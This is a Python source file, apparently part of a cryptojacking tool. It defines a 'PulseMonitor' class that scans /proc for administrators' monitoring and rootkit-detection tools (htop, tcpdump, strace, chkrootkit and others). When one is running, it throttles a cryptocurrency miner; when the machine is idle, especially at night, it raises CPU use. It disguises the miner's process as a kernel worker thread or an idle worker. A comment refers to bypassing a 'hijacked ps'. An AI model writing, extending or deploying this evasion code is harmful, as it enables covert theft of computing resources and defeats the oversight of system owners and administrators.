# PULSE MONITOR: ADAPTIVE THROTTLING & STEALTH
# =============================================================================

class PulseMonitor:
    """❤️ SOTA Pulse Throttling (Admin Detection & Masquerading)"""
    def __init__(self, orchestrator):
        self.orchestrator = orchestrator
        self.miner = orchestrator.miner
        self.logger = orchestrator.logger
        self.is_throttled = False
        self.lock = threading.Lock()
        self.monitoring = False
        self.last_activity_time = 0.0   # epoch of last admin/user activity
        self.deep_idle = False           # True when system inactive >20min + (night or low load)
    def start(self):
        with self.lock:
            if self.monitoring: return
            self.monitoring = True
        threading.Thread(target=self._monitor_loop, daemon=True, name="PulseMonitor").start()
        self.logger.info("PulseMonitor started -- admin detection active (5s interval)")
    def _monitor_loop(self):
        while self.monitoring:
            try:
                admin_active = self._detect_admin_activity()
                if admin_active:
                    self.last_activity_time = time.time()
                    self.deep_idle = False
                    self._throttle(True)
                else:
                    # Check if we can enter deep-idle (high-hashrate) mode
                    idle_secs = time.time() - self.last_activity_time if self.last_activity_time else 9999
                    now_hour  = __import__("datetime").datetime.now().hour
                    is_night  = now_hour >= 22 or now_hour < 7   # 22:00-07:00
                    inactive_long = idle_secs > 1200             # >20 minutes
                    new_deep = inactive_long and (is_night or idle_secs > 3600)
                    if new_deep != self.deep_idle:
                        self.deep_idle = new_deep
                        if new_deep:
                            self.logger.info(f"Deep-idle mode ON (inactive {idle_secs/60:.0f}min, night={is_night})")
                        else:
                            self.logger.info("Deep-idle mode OFF")
                    self._throttle(False)
            except Exception as _e:
                self.logger.warning(f"PulseMonitor loop error: {_e}")
            time.sleep(5)
    def _detect_admin_activity(self):
        # Scan /proc directly (bypasses hijacked ps).
        # ONLY flag processes with a controlling terminal (tty_nr != 0 in /proc/PID/stat).
        # This prevents system daemons like atopd (PID 270, tty_nr=0) from triggering
        # permanent stealth mode while still catching interactive btop/top/htop sessions.
        monitors = {"btop", "htop", "top", "atop", "iotop", "nethogs",
                    "wireshark", "tcpdump", "strace", "ltrace",
                    "bpftrace", "sysdig", "perf", "gdb", "rkhunter", "chkrootkit"}
        try:
            for _entry in os.listdir("/proc"):
                if not _entry.isdigit():
                    continue
                try:
                    with open(f"/proc/{_entry}/comm", "r") as _f:
                        _name = _f.read().strip().lower()
                    if _name not in monitors:
                        continue
                    # Check tty_nr (field 7 in /proc/PID/stat).
                    # 0 = no controlling terminal = daemon → skip.
                    # Non-zero = interactive session → flag.
                    try:
                        with open(f"/proc/{_entry}/stat", "r") as sf:
                            _tty = int(sf.read().split()[6])
                    except Exception:
                        _tty = 1  # if unreadable, assume interactive (safe default)
                    if _tty == 0:
                        continue  # daemon with no tty, skip
                    self.logger.warning(f"Admin tool detected: {_name} (PID {_entry})")
                    return True
                except OSError:
                    pass
        except Exception as _de:
            self.logger.warning(f"Admin detect error: {_de}")
        return False

    def _throttle(self, enable):
        with self.lock:
            if self.is_throttled == enable:
                # Still enter to allow deep_idle mode switch on already-unthrottled state
                if not enable and self.miner:
                    self.miner.apply_stealth_throttle(enable=False, deep=self.deep_idle)
                return
            self.is_throttled = enable
        if enable:
            self.logger.warning("Admin tool detected -- stealth mode")
            self._masquerade("ray::IDLE_WORKER")
            if self.miner: self.miner.apply_stealth_throttle(enable=True)
        else:
            if self.deep_idle:
                self.logger.info("Deep-idle: expanding to 70% cores nice+3")
                self._masquerade("[kworker/u2:1]")
                if self.miner: self.miner.apply_stealth_throttle(enable=False, deep=True)
            else:
                self.logger.info("Normal mode: 50% cores nice+5")
                self._masquerade("[kworker/u2:1]")
                if self.miner: self.miner.apply_stealth_throttle(enable=False, deep=False)
    def _masquerade(self, title):
        try:
            # Using global set_process_name (setproctitle)
            setproctitle.setproctitle(title)
        except:
            try:
                import ctypes
                libc = ctypes.CDLL("libc.so.6")
                libc.prctl(15, title.encode(), 0, 0, 0)
            except: pass

    def get_status(self):
        return {"throttled": self.is_throttled, "active": self.monitoring, "deep_idle": self.deep_idle}

